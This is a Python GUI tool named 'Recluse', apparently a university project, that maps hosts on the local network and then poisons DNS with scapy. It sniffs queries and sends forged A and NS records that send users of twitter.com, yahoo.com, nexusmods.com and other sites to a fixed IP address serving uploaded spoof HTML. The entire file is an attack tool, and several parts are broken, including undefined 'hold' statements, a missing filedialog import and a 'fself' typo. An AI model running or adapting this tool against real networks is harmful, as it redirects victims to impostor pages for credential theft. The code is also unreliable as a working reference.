import sys
import os
import subprocess
import re
from datetime import datetime
import shutil
from scapy.all import *
#from tkinter import filedialog
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *

class dns_window(QMainWindow):

    #Constructorr
    def __init__(self):
        super().__init__()
        self.htmloption = False
        self.running = False
        title = 'Recluse'
        self.iface = ""
        self.setWindowTitle(title)
        self.setGeometry(0,0,500,300) #Set window size
        self.center()
        self.baraction()
        self.dnsmenubar()
        self.connectbar()
        self.labels()
        self.buttons()
        self.show()
    def center(self):
        qr = self.frameGeometry() #Get information about the location and size of the window
        cp = QDesktopWidget().availableGeometry().center() #Determine the center position of the host monitor screen
        qr.moveCenter(cp) #Move rectangle position to center
        self.move(qr.topLeft()) #Move window to the rectangle position
    
    ##MenuBar
    def dnsmenubar(self):
        mbar = QMenuBar(self) #Create menu bar object
        self.setMenuBar(mbar) #Add menu bar object to window
        #Create new menu entities, "&Name" so entity is underlined
        filemenu = QMenu("&File",self)
        program = QMenu("&Program",self)
        view = QMenu("&View",self)
        helps = QMenu("&Help",self)
        #Add actions to menu entities
        program.addAction(self.startaction)
        program.addAction(self.stopaction)
        program.addAction(self.exitaction)
        program.addAction(self.versionaction)
        filemenu.addAction(self.uploadaction)
        view.addAction(self.logaction)
        view.addAction(self.sqlaction)
        helps.addAction(self.helpaction)
        helps.addAction(self.aboutaction)
        #Add menu entities to menu object
        mbar.addMenu(program)
        mbar.addMenu(filemenu)
        mbar.addMenu(view)
        mbar.addMenu(helps)
    def baraction(self):
        #Create action options under the menu entities
        self.startaction = QAction(QIcon("start.png"),"&Start",self)
        self.stopaction = QAction(QIcon("stop.png"), "&Stop",self)
        self.exitaction = QAction("&Exit",self)
        self.versionaction = QAction("&OS Version",self)
        self.uploadaction = QAction("&Upload HTML",self)
        self.logaction = QAction("&View Log",self)
        self.sqlaction = QAction("&View MySql",self)
        self.helpaction = QAction("&Help",self)
        self.aboutaction = QAction("&About",self)
    def connectbar(self):
        #Set functions that will be triggered by the action options
        self.startaction.triggered.connect(self.start)
        self.stopaction.triggered.connect(self.stop)
        self.exitaction.triggered.connect(self.close)
        self.versionaction.triggered.connect(self.version)
        self.uploadaction.triggered.connect(self.upload)
        self.logaction.triggered.connect(self.viewlog)
        self.sqlaction.triggered.connect(self.viewsql)
        self.helpaction.triggered.connect(self.help)
        self.aboutaction.triggered.connect(self.about)
    def start(self):
        self.Start()
    def stop(self):
        self.Stop()
    def version(self):
        hold
    def upload(self):
        filename = filedialog.askopenfilename() #Open file explorer to find a particular file
        htmldir = os.getcwd() #Returns current directory of program
        if len(filename) > 0:
            shutil.copy(filename,f"{htmldir}/HTMLSpoofs") #Copy HTML/php file to HTMLSpoofs directory
    def viewlog(self):
        hold
    def viewsql(self):
        hold
    def help(self):
        helpbox = QMessageBox(self)
        helpbox.setWindowTitle("Help")
        helptext = "To run click start, to stop click stop"
        helpbox.setText(helptext)
        helpbox.exec()
    def about(self):
        aboutbox = QMessageBox(self)
        aboutbox.setWindowTitle("About")
        abouttext = "A VCU project"
        aboutbox.setText(abouttext)
        aboutbox.exec()

    #HostIp/MAC
    def netretrieveWindows(self):
        try: 

            ipconfig = subprocess.run(['ipconfig','/all'], stdout=subprocess.PIPE).stdout.decode('utf-8')
            ipconfig_lines = ipconfig.splitlines()
            ipconfig_lines = [line.replace(" ","") for line in ipconfig_lines if 1==1]
            search_key = ipconfig_lines[8].split(":")

            found = 0
            x = 0
            MAC = ""
            IP = ""
            Subnet = ""
            while found == 0:
                if(ipconfig_lines[x] == f'Connection-specificDNSSuffix.:{search_key[1]}'):
                    y = x
                    found = 1
                    temp = ipconfig_lines[y:y+22]
                    MAC = temp[2]
                    IP = temp[8]
                    Subnet = temp[9]
                x = x+1

            MACnum = MAC[24:]; MACnum = MACnum.replace(":","")
            IPnum = IP[22:];  IPnum = IPnum.replace(":",""); IPnum = IPnum.replace("(Preferred)","")
            Subnum = Subnet[21:]; Subnum = Subnum.replace(":","")
            if(IP[:11] != "IPv4Address" or Subnet[:10] != "SubnetMask" or len(IPnum) < 4 or len(Subnum) < 4):
                raise Exception("An error occurred, please check your network")

            arptable = subprocess.run(['arp','-a'], stdout=subprocess.PIPE).stdout.decode('utf-8').splitlines()
            found = 0
            x = 0
            IPs_MAC = []
            tempARP = []
            while found == 0:
                if(re.match(f'Interface: {IPnum}(.)',arptable[x])):
                    x = x + 2
                    found = 1
                    while arptable[x] != '':
                        temp = arptable[x].split(" ")
                        for line in temp:
                            if(line != ''):
                                if(line == 'dynamic'):
                                    IPs_MAC.append(tempARP[0]); IPs_MAC.append(tempARP[1])
                                    tempARP.clear()
                                elif(line == 'static'):
                                    tempARP.clear()
                                else:
                                    tempARP.append(line)
                        x = x+1
                x = x+1
            IPs_MAC.append(IPnum); IPs_MAC.append(MACnum)
            return IPs_MAC

        except:
            print("An error occurred, retry or check your network config")

    def netretrieveLinux(self):
        try: 

            hostname = subprocess.run(['hostname','-I'], stdout=subprocess.PIPE).stdout.decode('utf-8')
            hostname = hostname.split(" ")

            ifconfig_lines = subprocess.run(['ifconfig','-a'], stdout=subprocess.PIPE).stdout.decode('utf-8').splitlines()
            ifconfig_lines = [line.strip() for line in ifconfig_lines if 1==1]


            found = 0
            iface = ""
            x = 0
            y = 0
            while found == 0:
                check = ifconfig_lines[x]
                check = check.split(" ")
                aface = re.search("^[a-zA-Z0-9_.-]*:$",check[0])
                if check[0] != "":
                    if aface:
                        iface = check[0].replace(":","")
                        y = x

                    if(check[1] == hostname[0]):
                        found = 1
                x = x + 1

            done = 0
            MAC = ""
            foundit = 0
            while done == 0:
                check = ifconfig_lines[y]
                check = check.split(" ")
                if(check[0] == 'ether' and foundit == 0):
                    MAC = check[1]
                    done = 1
                y = y+1
                if(ifconfig_lines[x] == ""):
                    done = 1

            arptable = subprocess.run(['arp','-a'], stdout=subprocess.PIPE).stdout.decode('utf-8').splitlines()

            arpdone = 0
            x = 0
            IPs_MAC = []
            tempARP = []
            paren_remove = ["(",")"]
            for x in range(len(arptable)):
                checkarp = arptable[x].split(" ")
                if(re.match(iface,checkarp[6])):
                    for paren in paren_remove:
                        checkarp[1] = checkarp[1].replace(paren,"")
                    IPs_MAC.append(checkarp[1]); IPs_MAC.append(checkarp[3])
            
            IPs_MAC.append(hostname[0]); IPs_MAC.append(MAC); IPs_MAC.append(iface)
            return IPs_MAC

        except:
            print("An error occurred, retry or check your network config")

    def IPsMAC(self):
        IpsMACs = self.netretrieveLinux()
        HostIP_MAC = []
        HostIP_MAC.append(IpsMACs[len(IpsMACs)-3]); HostIP_MAC.append(IpsMACs[len(IpsMACs)-2]); 
        self.hostLabel.setText(f"Host IP: {HostIP_MAC[0]}\nHost MAC: {HostIP_MAC[1]}")
        self.hostLabel.setAlignment(Qt.AlignLeft)
        self.hostLabel.resize(200,30)
        self.hostLabel.move(10,30)
        self.lists.clear()
        for x in range(0, len(IpsMACs)-3, 2):
            IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
            self.lists.addItem(IP)
        self.iface = IpsMACs[(len(IpsMACs)-1)]
            

    #Labels&Buttons
    def labels(self):
        self.hostLabel = QLabel(self) #Create Label object
        self.lists = QListWidget(self) #Create list object
        self.lists.setGeometry(30,50,300,135) #Set list size
        self.lists.move(10,100) #Set List position
        self.lists2 = QListWidget(self)
        self.lists2.setGeometry(30,50,300,50)
        self.lists2.move(10,240)
        self.domainLabel = QLabel("Domains to Poison",self)
        self.domainLabel.setAlignment(Qt.AlignCenter)
        self.domainLabel.move(320,70)
        self.domainLabel2 = QLabel("HTML to Spoof",self)
        self.domainLabel2.setAlignment(Qt.AlignCenter)
        self.domainLabel2.move(320,190)
        
    def buttons(self):
        self.ipbtn = QPushButton("LocateIPs",self) #Create regular button
        self.ipbtn.clicked.connect(self.IPsMAC)
        self.ipbtn.move(10,60)

        self.start = QPushButton("Start",self)
        self.start.clicked.connect(self.Start)
        self.start.move(110,60)
        self.stop = QPushButton("Stop",self)
        self.stop.clicked.connect(self.Stop)
        self.stop.move(210,60)

        self.dropdown = QComboBox(self) #Dropdown box button
        self.dropdown.addItem("All Domains")
        domains = open('domains.txt','r')
        urls = domains.readlines()
        for url in urls:
            self.dropdown.addItem(url.strip())
        self.dropdown.move(320,100)

        self.spoofHTML = QRadioButton("Spoof HTML",self) #Create bubble select button
        self.dontSpoof = QRadioButton("Dont spoof HTML",self)
        self.spoofHTML.setChecked(True)
        self.spoofHTML.toggled.connect(lambda:self.set_spoof(self.spoofHTML))
        self.dontSpoof.toggled.connect(lambda:self.set_spoof(self.dontSpoof))
        self.spoofHTML.move(320,140)
        self.dontSpoof.move(320,160)

        self.dropdown2 = QComboBox(self)
        self.dropdown2.addItem("All Domains")
        domainSpoof = open('domainSpoof.txt','r')
        urlSpoof = domainSpoof.readlines()
        for url in urlSpoof:
            self.dropdown2.addItem(url.strip())
        self.dropdown2.move(320,220)
    
    #Spoof/Poison Functions
    def dnsSpoofLinux(self,pkt):
        hostDict = { b'www.rbnorway.org',

                    b'rbnorway.org',
                    b'www.twitter.com',
                    b'twitter.com',
                    b'tekkenmods.com',
                    b'www.gstatic.com',
                    b'www.yahoo.com',
                    b'www.nexusmods.com',
                    b'nexusmods.com',
                    b'vacu.org',
                    b'www.vacu.org'
                    } #Dictionary to catch different ways of searching the domain

        for Names in hostDict: #For loop to check each name in hostDict

            if (DNS in pkt and Names in pkt[DNS].qd.qname): #Check if qname in packet matches any domain name in the hostDict
                print(f'packet found {Names}')
                print(pkt)
                if IP in pkt:
                    print(pkt[IP].src)
                    print(pkt[IP].dst)
                    IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst) #Switch source to be destination packet payload is sent back to the victim
                    
                    UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)

                    Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata='128.172.22.56') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim

                    NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata='128.172.22.56')

                    DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)
                    #Set qr to 1 to represent a response packet

                    spoofpkt = IPpkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt

                    send(spoofpkt,iface=fself.iface)#Send spoofed packet to the the victim

    def set_spoof(self,radio):
        if radio.text() == "Spoof HTML":
            if radio.isChecked() == True:
                htmloption = True
            else:
                htmloption = False
    def Start(self):
        if self.running == False:
            self.running = True
            if(self.iface == ""):
                getface = self.netretrieveLinux()
                self.iface = getface[len(getface)-1]
            time = datetime.now()
            self.lists2.addItem(f"Poisoning has begun {time}")
            pkt=sniff(filter='udp and dst port 53', prn=self.dnsSpoofLinux)
            print(pkt.summary())

    def Stop(self):
        if self.running == True:
            self.running = False
            time = datetime.datetime.now()
            self.lists2.addItem(f"Poisoning has ended {time}")
    
    #Error box
    def errorbox(self):
        error = QMessageBox(self)
        error.setWindowTitle("ERROR")
        error.setText("Something went wrong")
        error.exec()

        
    
app = QApplication(sys.argv) #Create new application
window = dns_window() #Create new window object for the gui
sys.exit(app.exec()) #Run application loop to run the gui
